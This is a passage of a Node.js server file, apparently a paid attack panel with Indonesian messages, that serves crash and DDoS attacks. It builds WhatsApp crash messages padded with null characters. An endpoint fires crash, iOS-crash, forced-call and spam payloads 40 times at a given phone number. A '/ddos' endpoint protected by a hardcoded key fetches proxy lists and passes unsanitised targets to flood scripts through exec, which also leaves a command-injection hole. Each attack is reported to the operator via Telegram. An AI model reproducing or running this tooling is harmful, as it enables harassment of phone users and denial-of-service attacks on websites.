                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "/u0000".repeat(1000),
                      format: ""
                    },
                    nativeFlowResponseMessage: {
                      name: "",
                      paramsJson: "",
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(isTarget, message, { messageId: null });
}

function toValidJid(nomor) {
  nomor = nomor.replace(/\D/g, '');

  if (nomor.startsWith("0")) {
    nomor = "62" + nomor.slice(1);
  } else if (nomor.startsWith("8")) {
    nomor = "62" + nomor;
  }

  if (nomor.length < 8 || nomor.length > 15) return null;

  return `${nomor}@s.whatsapp.net`;
}

app.get("/attack/metode", requireAuth, async (req, res) => {
  try {
    const metode = req.query.metode;
    const target = req.query.target;
    const ipClient = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const waktu = new Date().toLocaleString();

    if (!metode || !target) {
      return res.status(400).json({
        status: false,
        message: "'method' and 'target' parameters are required"
      });
    }

    const jid = toValidJid(target);
    if (!jid) {
      return res.status(400).json({
        status: false,
        message: "Nomor tidak valid"
      });
    }

    let decoded;
    try {
      decoded = jidDecode(jid);
    } catch (e) {
      return res.status(400).json({
        status: false,
        message: "JID decode gagal"
      });
    }

    if (typeof decoded !== 'object' || !decoded?.user || !isJidUser(jid)) {
      return res.status(400).json({
        status: false,
        message: "Invalid JID target (not a user JID or decode failed)"
      });
    }

    if (sessions.size === 0) {
      return res.status(400).json({
        status: false,
        message: "no active sender"
      });
    }

    const notifPesan = `
╭─────────────────
│New request bug
│From User: ${req.user.username} (${req.user.role})
│From IP: ${ipClient}
│Time: ${waktu}
│Method: ${metode}
│Target: ${target}
╰─────────────────
Bot By: @xpxteams
    `;
    await bot.telegram.sendMessage(owner, notifPesan);

    const botNumber = [...sessions.keys()][0];
    if (!botNumber) {
      return res.status(400).json({
        status: false,
        message: "no active sender"
      });
    }

    const skid = sessions.get(botNumber);
    if (!skid) {
      return res.status(400).json({
        status: false,
        message: "Socket not found for active bot number"
      });
    }

    const send = async (fn) => {
      for (let i = 0; i < 40; i++) {
        await fn(skid, jid);
      }
    };

    switch (metode.toLowerCase()) {
      case "foreclose":
      case "forcecall":
        await send(FlowXCall);
        break;
      case "blank":
      case "crash":
        await send(crash);
        break;
      case "ios":
        await send(ioscrash);
        break;
      case "delay":
        await send(delay);
        break;
      case "native":
        await send(Carouselspam);
        break;
      case "combo":
        for (let i = 0; i < 40; i++) {
          await FlowXCall(skid, jid);
          await crash(skid, jid);
        }
        break;
      default:
        return res.status(400).json({
          status: false,
          message: "metode tidak dikenali. Available: foreclose, forcecall, blank, crash, ios, delay, native, combo"
        });
    }

    return res.json({
      status: "200",
      creator: "@xpxteams",
      result: "sukses",
      target: jid.split("@")[0],
      metode: metode.toLowerCase(),
      user: req.user.username
    });

  } catch (err) {
    console.error("Gagal kirim:", err);
    return res.status(500).json({
      status: false,
      message: "Fitur Sedang Ada Perbaikan"
    });
  }
});

// DDOS Attack endpoint
app.get("/ddos", requireAuth, async (req, res) => {
  try {
    const { key, metode, target, time, proxyUrl } = req.query;
    const ipClient = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const waktu = new Date().toLocaleString();

    if (!key || !metode || !target || !time) {
      return res.status(400).json({ 
        status: false, 
        message: "Required parameters: key, metode, target, time" 
      });
    }

    if (key !== "NullByte") {
      return res.status(403).json({ 
        status: false, 
        message: "Incorrect API key" 
      });
    }

    const validMethods = ["xp-net", "xp-glory", "xp-bypass", "xp-cf", "xp-hold"];
    if (!validMethods.includes(metode)) {
      return res.status(400).json({ 
        status: false, 
        message: `Method '${metode}' is not recognized. Valid methods: ${validMethods.join(', ')}` 
      });
    }

    const duration = parseInt(time);
    if (isNaN(duration) || duration < 1 || duration > 500) {
      return res.status(400).json({ 
        status: false, 
        message: "Time must be 1 - 500 seconds" 
      });
    }

    // Handle proxy URL if provided
    let proxyStatus = "Using existing proxies";
    if (proxyUrl && proxyUrl.trim()) {
      try {
        const https = require('https');
        const http = require('http');
        const urlModule = require('url');

        const parsedUrl = urlModule.parse(proxyUrl);
        const protocol = parsedUrl.protocol === 'https:' ? https : http;

        await new Promise((resolve, reject) => {
          const request = protocol.get(proxyUrl, (response) => {
            let data = '';

            response.on('data', (chunk) => {
              data += chunk;
            });

            response.on('end', () => {
              if (response.statusCode === 200) {
                // Validate proxy format (host:port per line)
                const proxies = data.split('\n')
                  .map(line => line.trim())
                  .filter(line => line && line.includes(':'))
                  .filter(line => {
                    const [host, port] = line.split(':');
                    return host && port && !isNaN(parseInt(port));
                  });

                if (proxies.length > 0) {
                  // Append to existing proxy.txt
                  const existingProxies = fs.existsSync('./proxy.txt') 
                    ? fs.readFileSync('./proxy.txt', 'utf-8').split('\n').filter(Boolean)
                    : [];

                  const allProxies = [...new Set([...existingProxies, ...proxies])]; // Remove duplicates
                  fs.writeFileSync('./proxy.txt', allProxies.join('\n'));

                  proxyStatus = `Added ${proxies.length} new proxies (${allProxies.length} total)`;
                } else {
                  proxyStatus = "No valid proxies found in URL";
                }
                resolve();
              } else {
                proxyStatus = `Failed to fetch proxies (HTTP ${response.statusCode})`;
                resolve();
              }
            });
          });

          request.on('error', (error) => {
            console.error('Proxy fetch error:', error);
            proxyStatus = "Failed to fetch proxy list";
            resolve();
          });

          request.setTimeout(10000, () => {
            request.destroy();
            proxyStatus = "Proxy fetch timeout";
            resolve();
          });
        });
      } catch (error) {
        console.error('Proxy URL processing error:', error);
        proxyStatus = "Error processing proxy URL";
      }
    }

    // Notify via Telegram
    const notifPesan = `
╭─────────────────
│New DDOS request
│From User: ${req.user.username} (${req.user.role})
│From IP: ${ipClient}
│Time: ${waktu}
│Method: ${metode}
│Target: ${target}
│Duration: ${duration}s
│Proxy: ${proxyStatus}
╰─────────────────
Bot By: @xpxteams
    `;
    await bot.telegram.sendMessage(owner, notifPesan);

    let command;
    const { exec } = require("child_process");

    if (metode === "xp-net") {
      console.log("📡 xp-net method received");
      command = `node xp-net.js ${target} ${duration} proxy.txt`;
    } else if (metode === "xp-hold") {
      console.log("⚔️ xp-hold method received");
      command = `node xp-hold.js ${target} ${duration} proxy.txt`;
    } else if (metode === "xp-bypass") {
      console.log("🛠️ xp-bypass method received");
      command = `node xp-bypass.js ${target} ${duration} 100 10 proxy.txt`;
    } else if (metode === "xp-glory") {
      console.log("🌊 xp-glory method received");
      command = `node xp-glory.js ${target} ${duration} 100 10 proxy.txt`;
    } else if (metode === "xp-cf") {
      console.log("☁️ xp-cf method received");
      command = `node xp-cf.js ${target} ${duration} 100 10 proxy.txt`;
    } else {
      return res.status(500).json({ 
        status: false, 
        message: "The method has not been handled on the server." 
      });
    }

    // Execute DDOS command
    exec(command, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.warn(`Stderr: ${stderr}`);
      }
      console.log(`Output: ${stdout}`);
    });

    res.json({
      status: true,
      Target: target,
      Methods: metode,
      Time: duration,
      News: "Success",
      proxyStatus: proxyStatus
    });

  } catch (err) {
    console.error("DDOS attack error:", err);
    return res.status(500).json({
      status: false,
      message: "Internal server error"
    });
  }
});

// 404 middleware - must be after all other routes
app.use((req, res, next) => {
  res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({
    success: false,
    message: 'Internal Server Error'
  });
});

// ====================== INISIALISASI ======================
initializeWhatsAppConnections();
bot.launch();

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server is running on port ${PORT}`);
  console.log(`📱 Access dashboard: http://0.0.0.0:${PORT}/dashboard`);
  console.log(`⚡ Access DDOS panel: http://0.0.0.0:${PORT}/ddos-dashboard`);
  console.log(`🌐 Public URL: https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co`);
});